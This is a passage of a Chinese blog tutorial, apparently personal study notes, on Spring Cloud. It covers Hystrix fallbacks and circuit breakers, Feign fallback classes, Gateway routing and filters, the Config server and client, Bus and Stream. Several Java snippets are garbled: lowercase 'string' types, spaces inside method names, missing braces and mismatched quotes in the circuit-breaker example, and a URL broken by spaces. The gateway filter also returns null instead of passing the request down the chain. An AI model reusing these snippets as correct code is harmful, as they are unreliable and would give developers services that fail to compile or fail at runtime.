e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"线程池： "</span></span><br><span class="line">                + Thread.currentThread().getName()</span><br><span class="line">                + <span class="string">"paymentInfo_TimeOut, id"</span></span><br><span class="line">                + id</span><br><span class="line">                + <span class="string">"\t"</span></span><br><span class="line">                + <span class="string">"耗时3秒"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_TimeOutHandler</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">3</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"线程池： "</span></span><br><span class="line">                + Thread.currentThread().getName()</span><br><span class="line">                + <span class="string">"paymentInfo_TimeOutHandler, id"</span></span><br><span class="line">                + id</span><br><span class="line">                + <span class="string">"\t"</span></span><br><span class="line">                + <span class="string">"系统繁忙，请稍后再试"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>当有多个方法需要进行降级处理时，使用@<code>DefaultProperties</code>注解在类上，指明默认的奖及策略，此时使用@<code>HystrixCommand</code>注解的方法会调用该默认策略。</p></blockquote><h4 id="Feign-Fallback"><a href="#Feign-Fallback" class="headerlink" title="Feign Fallback"></a>Feign Fallback</h4><p>根据cloud-consumer-feign-hystrix-order80已经有的PaymentHystrixService接口，重新新建一个类(PaymentFallbackService)实现该接口， 统一为接口里面的方法进行异常处理PaymentFallbackService类实现PaymentFeignClientService接口。</p><blockquote><p>:star:这种思路相当于针对service接口层进行集中处理降级，由于service层接口使用Feign调用微服务，只需要编写集成这些接口的降级处理类，并绑定到该接口上即可。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@FeignClient</span>(value = <span class="string">"CLOUD-PROVIDER-HYSTRIX-PAYMENT"</span> ,fallback = PaymentFallbackservice<span class="class">.<span class="keyword">class</span> )</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">interface</span> <span class="title">PaymentHystrixService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="meta">@GetMapping</span>(<span class="string">"/payment/hystrix/ok/&#123;id&#125;"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> string paymentInfo_ <span class="title">OK</span> <span class="params">(@PathVariable(<span class="string">"id"</span>)</span> Integer id)</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">" /payment/hystrix/timeout/&#123;id&#125;"</span> )</span><br><span class="line">    <span class="function"><span class="keyword">public</span> string payment Info_ <span class="title">TimeOut</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span> Integer id)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentFallbackService</span> <span class="keyword">implements</span> <span class="title">PaymentHystrixService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> string <span class="title">paymentInfo_OK</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"-----PaymentFallbackService fa1l back-paymentInfo_ OK ,0(τ_ π)o"</span>;</span><br><span class="line">	<span class="meta">@override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> string <span class="title">paymentInfo_Timeout</span><span class="params">(Integer id)</span></span></span><br><span class="line"><span class="function">	return "-----PaymentFallbackservice fall back-paymentInfo_ TimeOut ,0<span class="params">(τ_ .π)</span>o"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="熔断机制"><a href="#熔断机制" class="headerlink" title="熔断机制"></a>熔断机制</h4><p>​ 熔断机制是应对雪崩效应的一种微服务链路保护机制。当扇出链路的某个微服务出错不可用或者响应时间太长时,会进行服务的降级,进而熔断该节点微服务的调用，快速返回错误的响应信息。当检测到该节点微服务调用响应正常后,恢复调用链路。在Spring Cloud框架里,熔断机制通过Hystrix实现。Hystrix会监控微服务间调用的状况，当失败的调用到一定阈值,缺省是5秒内20次调用失败,就会启动熔断机制。熔断机制的注解是@HystrixCommand.</p><h5 id="熔断案例"><a href="#熔断案例" class="headerlink" title="熔断案例"></a>熔断案例</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//=====服务熔断</span></span><br><span class="line"><span class="meta">@HystrixCommand</span>( fallbackMethod = <span class="string">"paymentCircuitBreaker_fallback"</span> , commandproperties = &#123;</span><br><span class="line"><span class="meta">@HystrixProperty</span>(name = <span class="string">"circuitBreaker.enabled"</span> ,value = <span class="string">"true"</span>),<span class="comment">// 是否开启断路器</span></span><br><span class="line"><span class="meta">@HystrixProperty</span>(name = <span class="string">"circuitBreaker.requestVolumeThreshold"</span> ,value = <span class="string">"10"</span>),<span class="comment">// 请求次数</span></span><br><span class="line"><span class="meta">@HystrixProperty</span>(name = <span class="string">"circuitBreaker.sleepwindowInMilliseconds"</span> ,value = <span class="string">"10000"</span>), <span class="comment">//时间窗口期,即从断开进入到半开的等待时间</span></span><br><span class="line"><span class="meta">@HystrixProperty</span>(name = <span class="string">"circuitBreaker.errorThresholdPercentage"</span> ,value = <span class="string">"60"</span>),<span class="comment">// 失败率达到多少后跳闻</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> string <span class="title">paymentCircuitBreaker</span> <span class="params">(@Pathvariable(<span class="string">"id"</span>)</span> Integer id)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(id &lt; <span class="number">0</span>)</span><br><span class="line">    	<span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(******id 不能负数<span class="string">");</span></span><br><span class="line"><span class="string">    String serialNumber = Idutil.simpleUUID();</span></span><br><span class="line"><span class="string">    return Thread.current.Thread().getName()+"</span>\t<span class="string">"+"</span>调用成功，流水号:<span class="string">"+ 				serialNumber;</span></span><br><span class="line"><span class="string">public String paymentCircuitBreaker_fallback(@PathVariable("</span>id<span class="string">") Integer id)&#123;</span></span><br><span class="line"><span class="string">    return "</span>id不能负数，请稍后再试，/(ToT)/~~ id:<span class="string">"+id;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[熔断] --&gt;|触发| B[降级]</span><br></pre></td></tr></table></figure><h3 id="服务网关"><a href="#服务网关" class="headerlink" title="服务网关"></a>服务网关</h3><h4 id="GatWay"><a href="#GatWay" class="headerlink" title="GatWay"></a>GatWay</h4><p>SpringCloud Gateway作为Spring Cloud生态系统中的网关,目标是替代Zuul,在Spring Cloud 2.0以上版本中，没有对新版本的Zuu1 2.上最新高性能版本进行集成，仍然还是使用的Zuul 1.x非Reactor模式的老版本。而为了提升网关的性能，SpringCloud Gateway是基于WebFlux框架实现的，而WebFlux框架底层则使用了高性能的Reactor模式通信框架Netty。</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200718090110820.png" alt="image-20200718090110820" style="zoom:80%"><h4 id="Route"><a href="#Route" class="headerlink" title="Route"></a>Route</h4><blockquote><p>路由是构建网关的基本模块，它由ID，目标URI, 一系列的断言和过滤器组成，如果断言为true则匹配该路由</p></blockquote><h4 id="Predicate（断言）"><a href="#Predicate（断言）" class="headerlink" title="Predicate（断言）"></a>Predicate（断言）</h4><blockquote><p>开发人员可以匹配HTTP请求中的所有内容(例如请求头或请求参数)， 如果请求与断言相匹配则进行路由</p></blockquote><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><blockquote><p>指的是Spring框架中GatewayFilter的实例，使用过滤器，可以在请求被路由前或者之后对请求进行修改</p></blockquote><p>:star:Filter在”pre” 类型的过滤器可以做<code>参数校验、权限校验、流量监控、日志输出、协议转换</code>等，在”post” 类型的过滤器中可以做<code>响应内容、响应头的修改，旧志的输出，流量监控</code>等有着非常重要的作用。</p><h4 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h4><blockquote><p>POM，注意要排除web依赖</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--gateway--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML，注意<code>- Path</code>的P是大写</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh</span> <span class="comment">#路由的ID，没有固定规则但要求唯-，建议配合服务名</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">http://localhost:8001</span> <span class="comment">#匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/get/**</span> <span class="comment">#断言，路径相匹配的进行路由</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh2</span> <span class="comment">#路由的ID，没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">http://localhost:8001</span> <span class="comment">#匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/lb/**</span> <span class="comment">#断言，路径相匹配的进行路由</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">cloud-gateway-service</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka</span></span><br></pre></td></tr></table></figure><p>:star: 实际场景下，网关将指定端口拦截并路由到指定ip+内部端口，此内部端口会添加防火墙</p><blockquote><p>硬编码写法</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GatewayConfig</span></span></span><br><span class="line"><span class="class">        @<span class="title">Bean</span></span></span><br><span class="line"><span class="class">        <span class="title">public</span> <span class="title">RouteLocator</span> <span class="title">customRouteLocator</span>( <span class="title">RouteLocatorBuilder</span> <span class="title">routeLocatorBuilder</span>)</span></span><br><span class="line"><span class="class">        <span class="title">RouteLocatorBuilder</span>.<span class="title">Builder</span> <span class="title">routes</span> </span>= routeLocatorBuilder.routes(); </span><br><span class="line"></span><br><span class="line">        routes.route(<span class="string">"path_route_atguigu"</span>, r -&gt; r.path(<span class="string">"/guonei"</span> ).uri(<span class="string">"http://news . baidu. com/ guonei"</span>)).build();</span><br><span class="line">        <span class="keyword">return</span> routes.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="配置动态路由"><a href="#配置动态路由" class="headerlink" title="配置动态路由"></a>配置动态路由</h4><blockquote><p>负载均衡使用的Ribbon</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh</span> <span class="comment">#路由的ID，没有固定规则但要求唯-，建议配合服务名</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://cloud-payment-service</span> <span class="comment">#路由的微服务名称，lb是负载均衡</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/get/**</span> <span class="comment">#断言，路径相匹配的进行路由</span></span><br><span class="line"><span class="comment">#        - id: payment_routh2 #路由的ID，没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line"><span class="comment">#          uri: lb://cloud-payment-service #匹配后提供服务的路由地址</span></span><br><span class="line"><span class="comment">#          predicates:</span></span><br><span class="line"><span class="comment">#            - Path=/payment/lb/** #断言，路径相匹配的进行路由</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">locator:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span> <span class="comment">#开启冲注册中心动态创建路由的功能，利用微服务进行路由</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">cloud-gateway-service</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka</span></span><br></pre></td></tr></table></figure><h4 id="常用的predicates"><a href="#常用的predicates" class="headerlink" title="常用的predicates"></a>常用的predicates</h4><p>GateWay有多种断言，包含对时间、Cookie、Header、Host、Path、Query等多种条件的匹配，参数为名称+正则表达式</p><h4 id="Filter的使用：主要是自定义过滤器"><a href="#Filter的使用：主要是自定义过滤器" class="headerlink" title="Filter的使用：主要是自定义过滤器"></a>Filter的使用：主要是自定义过滤器</h4><p>路由过滤器可用于修改进入的HTTP请求和返回的HTTP响应，路由过滤器只能指定路由进行使用。Spring Cloud Gateway内置了多种路由过滤器,他们都由GatewayFilter的工厂类来产生</p><blockquote><p>过滤器类似于Spring的拦截器可以进行生成日志、鉴权等工作</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tosang.springcloud.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/7/18 11:19</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLogGateWayFilter</span> <span class="keyword">implements</span> <span class="title">GlobalFilter</span>, <span class="title">Ordered</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Mono&lt;Void&gt; <span class="title">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"************come in MyLogGateWayFilter: "</span> + <span class="keyword">new</span> Date());</span><br><span class="line">        String uname = exchange.getRequest().getQueryParams().getFirst(<span class="string">"uname"</span>);</span><br><span class="line">        <span class="keyword">if</span>(uname == <span class="keyword">null</span>)&#123;</span><br><span class="line">            log.info(<span class="string">"************用户非法"</span>);</span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.NOT_ACCEPTABLE);</span><br><span class="line">            <span class="comment">/*设置完成*/</span></span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getOrder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//order代表加载过滤器的顺序，数字越小优先级越高</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><p>分布式微服务配置中心</p><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置中心--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-config-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3344</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-config-center</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">server:</span></span><br><span class="line">        <span class="attr">git:</span> </span><br><span class="line">          <span class="attr">uri:</span> <span class="string">xxxxxxxxxx</span> <span class="comment">##建议使用https，ssh需要认证</span></span><br><span class="line">          <span class="attr">search-paths:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">springcloud-config</span></span><br><span class="line">          <span class="comment">## 私有库设置git账号密码</span></span><br><span class="line">          <span class="attr">username:</span> <span class="string">xxxx</span></span><br><span class="line">          <span class="attr">password:</span> <span class="string">xxxxx</span></span><br><span class="line">          <span class="comment">## 分支</span></span><br><span class="line">        <span class="attr">default-label:</span> <span class="string">master</span></span><br><span class="line"><span class="attr">eureka:</span> <span class="comment">##注册到eureka</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure><blockquote><p>主启动类添加注解</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@EnableConfigServer</span> <span class="comment">//添加该注解</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigCenterMain3344</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(ConfigCenterMain3344<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>访问格式 1</p></blockquote><p><code>http://loacalhost:port/{label}/{application}-{profile}.yml</code></p><p>其中{label}代表分支，可以省略，默认是master分支</p><p>{application}-{profile}.yml是文件名</p><p>{profile}一般是指明环境：开发，测试，发布等</p><blockquote><p>访问格式 2</p></blockquote><p>逆向url访问，得到的是json字符串</p><h4 id="客户端配置与测试"><a href="#客户端配置与测试" class="headerlink" title="客户端配置与测试"></a>客户端配置与测试</h4><blockquote><p>POM文件引入客户端</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置中心客户端--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bootstrap.yml加载外部源</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3355</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">config-client</span></span><br><span class="line">  <span class="attr">cloud:</span> <span class="comment">#Config客户端配置</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">master</span> <span class="comment">#分支名称</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">config</span> <span class="comment">#配置文件名称</span></span><br><span class="line">      <span class="attr">profile:</span> <span class="string">dev</span> <span class="comment">#读取后缀名称</span></span><br><span class="line">      <span class="attr">uri:</span> <span class="string">http://localhost:3344</span> <span class="comment">#配置中心地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务注册到eureka地址</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure><blockquote><p>控制层注入配置</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tosang.springcloud.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2020/7/19 15:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigClientController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"&#123;spring.application.name&#125;"</span>) <span class="comment">//这里填写远程yml信息</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/configInfo"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Config动态刷新"><a href="#Config动态刷新" class="headerlink" title="Config动态刷新"></a>Config动态刷新</h4><p>默认情况下客户端读取的数据不会随着github仓库动态刷新，每次都需要重启客户端，很烦:cry:</p><blockquote><p>解决办法——&gt;手动刷新</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#步骤如下：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#POM引入actuator监控</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改YML，暴露监控端点</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">	<span class="attr">endpoints:</span></span><br><span class="line">		<span class="attr">web:</span></span><br><span class="line">			<span class="attr">exposure:</span></span><br><span class="line">				<span class="attr">include:</span> <span class="string">"*"</span></span><br><span class="line"><span class="comment">#Controller添加注解： @RefreshScope业务类</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#此时修改   github---&gt; 3344 ---&gt;3355</span></span><br></pre></td></tr></table></figure><blockquote><p>修改完之后还需要post命令请求刷新：curl -X POST “<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdC9hY3R1YXRvci9yZWZyZXNoJnF1b3Q7">http://localhost/actuator/refresh&quot;<i class="fa fa-external-link-alt"></i></span></p></blockquote><h3 id="Bus消息总线"><a href="#Bus消息总线" class="headerlink" title="Bus消息总线"></a>Bus消息总线</h3><p>SpringCloud Bus配合SpringCloud Config使用可以实现配置的动态刷新。</p><blockquote><p>:star:利用消息总线触发一个服务端ContigServer的/bus/refresh端点，通过<code>rabbitmq</code>广播刷新<strong>所有</strong>客户端的配置。</p><p>:heavy_exclamation_mark:但是一般不加在config客户端，因为从设计思想上考虑，微服务负责的功能应该单一，应该减少对微服务客户端的侵入。</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200720102146254.png" alt="image-20200720102146254"></p><h3 id="SpringCloud-Stream"><a href="#SpringCloud-Stream" class="headerlink" title="SpringCloud Stream"></a>SpringCloud Stream</h3><p>官方定义Spring Cloud Stream是一个构建消息驱动微服务的框架。应用程序通过inputs或者outputs来与Spring Cloud Streamtlbinder对象交互。通过我们配置来binding(绑定) ,而Spring Cloud Stream的binder对象负责与消息中间件交互。所以，我们只需要搞清楚如何与Spring Cloud Stream交互就可以方便使用消息驱动的方式。通过使用Spring Integration来连接消息代理中间件以实现消息事件驱动。Spring Cloud Stream为一些供应商的消息中间件产品提供了个性化的自动化配置实现,引用了发布-订阅、消费组、分区的三个核心概念。</p><p>目前仅支持RabbitMQ、Kafka.</p><blockquote><p>Binder：很方便的连接中间件，屏蔽差异</p><p>Channel：队列Queue的一种抽象</p><p>Source和Sink：消息输入与输出</p></blockquote><h4 id="生产者-amp-消费者"><a href="#生产者-amp-消费者" class="headerlink" title="生产者&amp;消费者"></a>生产者&amp;消费者</h4><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-stream-rabbit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8801</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-stream-provider</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">stream:</span></span><br><span class="line">      <span class="comment">## bingdings相当于一个绑定实例</span></span><br><span class="line">      <span class="attr">bindings:</span></span><br><span class="line">        <span class="attr">output:</span> <span class="comment">#这个名字是一个通道的名称，可以自定义</span></span><br><span class="line">          <span class="attr">destination:</span> <span class="string">studyExchange</span> <span class="comment">#表示要使用Exchange名称定义</span></span><br><span class="line">          <span class="attr">content-type:</span> <span class="string">application/json</span> <span class="comment">#设置消息类型，本次为json， 文本则没置"text/plain'</span></span><br><span class="line">          <span class="attr">binder:</span> <span class="string">defaultRabbit</span> <span class="comment">#绑定的名称</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">#binder: 